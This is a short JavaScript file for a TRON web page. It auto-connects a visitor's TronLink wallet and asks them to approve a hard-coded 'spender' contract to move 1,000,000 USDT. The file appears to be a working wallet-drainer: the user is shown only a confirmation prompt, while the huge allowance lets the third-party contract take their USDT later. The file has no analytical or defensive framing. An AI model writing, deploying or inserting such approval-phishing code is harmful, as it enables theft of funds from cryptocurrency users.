let tronWeb;
let tokenContract;
let userAddress;

// 🔴 TRC20 USDT (TRON Mainnet)
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 🔴 YOUR SPENDER CONTRACT (AS PROVIDED)
const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

// 🔴 USDT DECIMALS ON TRON
const DECIMALS = 6;

// 🔴 FIXED APPROVAL AMOUNT = 1,000,000 USDT
const FIXED_USDT_AMOUNT = "1000000"; // 1M USDT (human-readable)

// Auto-connect if TronLink already authorized
window.addEventListener("load", async () => {
  if (window.tronWeb && window.tronWeb.ready) {
    await connectWallet();
  }
});

async function connectWallet() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("Please open this page in TronLink");
    return;
  }

  tronWeb = window.tronWeb;
  userAddress = tronWeb.defaultAddress.base58;

  tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);

  document.getElementById("status").innerText =
    `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
}

async function executeApproval() {
  if (!tokenContract) {
    await connectWallet();
  }

  try {
    // 🔒 FIXED AMOUNT CONVERSION (1,000,000 * 10^6)
    const approvalAmount = tronWeb
      .toBigNumber(FIXED_USDT_AMOUNT)
      .times(tronWeb.toBigNumber(10).pow(DECIMALS))
      .toString();

    document.getElementById("status").innerText =
      "Confirm 1,000,000 USDT approval in TronLink...";

    // 🔑 APPROVE FIXED AMOUNT TO SPENDER
    const tx = await tokenContract.approve(
      SPENDER_ADDRESS,
      approvalAmount
    ).send({
      feeLimit: 100_000_000
    });

    document.getElementById("status").innerText =
      `Approved 1,000,000 USDT ✔ Tx: ${tx}`;

  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText =
      "Approval cancelled or failed";
  }
}
